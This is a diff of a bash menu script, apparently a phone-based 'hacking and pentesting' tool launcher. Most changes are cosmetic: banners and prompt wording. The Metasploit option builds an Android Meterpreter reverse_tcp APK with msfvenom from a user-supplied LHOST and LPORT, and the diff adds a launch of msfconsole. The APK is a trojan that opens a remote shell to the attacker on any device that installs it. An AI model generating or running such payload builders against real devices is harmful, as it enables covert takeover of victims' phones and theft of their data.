@@ -6,13 +6,13 @@ lpr='\033[1;35m'
 yelw='\033[1;33m'
 null='\033[0m'
 gr='\033[0;32m'
-echo "***********************************************************************" | lolcat
+echo "*********************************************************************" | lolcat
 echo "       [\:\> HACKING AND PENTESTING WITH VAMPIER VERMA </:/]" | lolcat --animate
-echo "***********************************************************************" | lolcat
+echo "*********************************************************************" | lolcat
 toilet -f mono12 "T-VERMA" | lolcat
-echo "***********************************************************************" | lolcat
+echo "*********************************************************************" | lolcat
 echo "      #_> THIS TOOL IS MADE BY VAMPIER >> [> SANDEEP VERMA <]" | lolcat --animate
-echo "***********************************************************************" | lolcat
+echo "*********************************************************************" | lolcat
 echo
 echo
 printf "          ${red} [+] Enter the Tool number to Run [+] ${null}\n" 
@@ -71,25 +71,30 @@ fi
 if [[ $ch == 5 ]]; then
 
 printf "${red}Running${null}${yelw} Metasploit Framework ...${null} \n"
+clear
 figlet -f standard "MSF"
 echo
 printf "1). Create Payload.\n" | lolcat --animate
 printf "2). Start  Listener.\n" | lolcat --animate
 echo
-echo
+printf "${yelw}[#]:> ${null}"
 read op
+echo 
 if [[ $op == 1 ]]; then
 
-printf "${yelw}Enter your LHOST:>${null}\n"
+printf "${yelw}[#] Enter your LHOST :> ${null}"
 read host
 echo
-printf "${yelw}Enter your LPORT:>${null}\n"
+printf "${yelw}[#] Enter your LPORT :> ${null}"
 read port
 echo
-printf "${yelw}Enter Payload Name:>${null}\n"
+printf "${yelw}[#] Enter payload name :> ${null}"
 read name
 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o /sdcard/$name.apk
+
+msfconsole
+
 fi
 
 if [[ $op == 2 ]]; then 
